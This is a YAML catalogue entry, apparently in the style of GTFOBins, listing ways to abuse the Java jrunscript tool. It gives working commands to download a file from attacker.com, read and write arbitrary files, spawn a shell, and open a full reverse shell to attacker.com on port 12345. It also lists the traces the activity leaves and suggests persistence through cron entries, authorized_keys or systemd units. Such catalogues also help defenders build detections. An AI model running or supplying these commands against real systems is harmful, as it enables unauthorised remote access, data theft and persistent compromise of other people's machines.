---
name: jrunscript
capabilities:
- exec
- spawn
- read
- write
- download
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: This tool is installed starting with Java SE 6.
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")'
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: |-
    jrunscript -e 'br = new BufferedReader(new java.io.FileReader("/path/to/input-file"));
        while ((line = br.readLine()) != null) { print(line); }'
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: |-
    jrunscript -e 'var fw=new java.io.FileWriter("/path/to/output-file");
        fw.write("DATA");
        fw.close();'
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: |-
    jrunscript -e 'var host="attacker.com";
        var port=12345;
        var p=new java.lang.ProcessBuilder("/bin/sh", "-i").redirectErrorStream(true).start();
        var s=new java.net.Socket(host,port);
        var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
        while(pi.available()>0)so.write(pi.read());
        while(pe.available()>0)so.write(pe.read());
        while(si.available()>0)po.write(si.read());
        so.flush();po.flush();
        java.lang.Thread.sleep(50);
        try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: jrunscript -e 'exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty")'
references:
- https://gtfobins.github.io/gtfobins/jrunscript/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
